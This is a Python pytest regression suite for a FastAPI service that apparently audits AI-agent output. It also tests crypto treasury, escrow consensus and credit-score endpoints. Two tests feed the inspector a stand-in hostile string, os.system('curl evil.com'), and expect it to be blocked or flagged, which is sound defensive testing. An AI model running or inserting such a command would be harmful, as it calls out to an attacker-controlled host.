"""
Full System Integration & Regression Test Suite.
Verifies all existing and newly implemented subsystems work in harmony without side-effects.
"""

import time
import pytest
from fastapi.testclient import TestClient
from app.main import app

client = TestClient(app)


def test_core_legacy_endpoints():
    """Verify legacy health, metrics, challenge, and inspect endpoints."""
    # Health
    r = client.get("/health")
    assert r.status_code == 200
    assert r.json().get("status") in ["healthy", "ok"]

    # Metrics
    r = client.get("/metrics")
    assert r.status_code == 200

    # Gate challenge (x402 protocol)
    for chain_id in [137, 8453, 42161]:
        r = client.get(f"/api/v1/gate/challenge?chain_id={chain_id}")
        assert r.status_code in [200, 402]
        assert "protocol" in r.text or "x402" in r.text

    # Core inspection
    clean = client.post("/inspect", json={"agent_output": "Swap 100 USDC for DAI"})
    assert clean.status_code == 200
    assert clean.json().get("audit", {}).get("verdict") == "PASSED"

    exploit = client.post("/inspect", json={"agent_output": "os.system('curl evil.com')", "is_code": True})
    assert exploit.status_code == 200
    assert exploit.json().get("audit", {}).get("verdict") in ["BLOCKED", "SLASHED", "FLAGGED"]


def test_sovereign_treasury_system():
    """Verify Sovereign RWA Treasury and EIP-712 Proof-of-Reserve."""
    # Reserves
    r = client.get("/api/v1/treasury/reserves")
    assert r.status_code == 200
    res_data = r.json()
    assert res_data.get("operator_withdrawal_allowed") is False
    assert res_data.get("financials", {}).get("total_sovereign_reserves_usdc", 0) > 1500000.0

    # PoR
    por = client.get("/api/v1/treasury/proof-of-reserve?chain_id=137")
    assert por.status_code == 200
    por_data = por.json()
    attestation = por_data.get("attestation", {})
    assert attestation.get("signature", "").startswith("0x")
    assert por_data.get("operator_withdrawal_allowed") is False
    assert por_data.get("reserves_verified_usdc", 0) > 1500000.0

    # Compounding simulation
    sim = client.post("/api/v1/treasury/simulate-compound", json={"days": 30})
    assert sim.status_code == 200
    assert sim.json().get("simulation_days") == 30


def test_agent_escrow_and_consensus():
    """Verify Single Audit and 3-of-5 BFT Consensus Multi-Oracle."""
    # Single audit
    r = client.post("/api/v1/escrow/audit", json={
        "job_id": 901,
        "deliverable": "def clean_calc(): return 42",
        "is_code": True,
        "chain_id": 137
    })
    assert r.status_code == 200
    assert "attestation" in r.json()

    # Validators info
    v = client.get("/api/v1/consensus/validators")
    assert v.status_code == 200
    assert v.json().get("cluster_size") == 6

    # Consensus audit
    ca = client.post("/api/v1/escrow/consensus-audit", json={
        "job_id": 902,
        "deliverable": "def safe(): pass",
        "is_code": True,
        "chain_id": 137
    })
    assert ca.json().get("consensus_reached") is True
    assert len(ca.json().get("validator_signatures", [])) == 6




def test_agent_credit_and_did():
    """Verify Agent Credit Scoring and EIP-712 Reputation Attestations."""
    top_addr = "0x71C8364737Ac3529360573e7218E66270436d65b"
    score = client.get(f"/api/v1/credit/score/{top_addr}")
    assert score.status_code == 200
    assert score.json().get("credit_score", 0) >= 800

    att = client.get(f"/api/v1/credit/attestation/{top_addr}?chain_id=137")
    assert att.status_code == 200
    assert att.json().get("attestation", {}).get("signature", "").startswith("0x")


def test_system_edge_cases_and_robustness():
    """Verify malformed inputs, massive payloads, and extreme boundaries."""
    # Zero address
    z = client.get("/api/v1/credit/score/0x0000000000000000000000000000000000000000")
    assert z.status_code == 200

    # Huge payload (50KB)
    huge = "A" * 25000 + " os.system('curl evil.com') " + "B" * 25000
    t0 = time.perf_counter()
    h = client.post("/inspect", json={"agent_output": huge, "is_code": True})
    latency_ms = (time.perf_counter() - t0) * 1000.0
    assert h.status_code == 200
    assert latency_ms < 500.0  # Fast sub-500ms processing even under heavy load
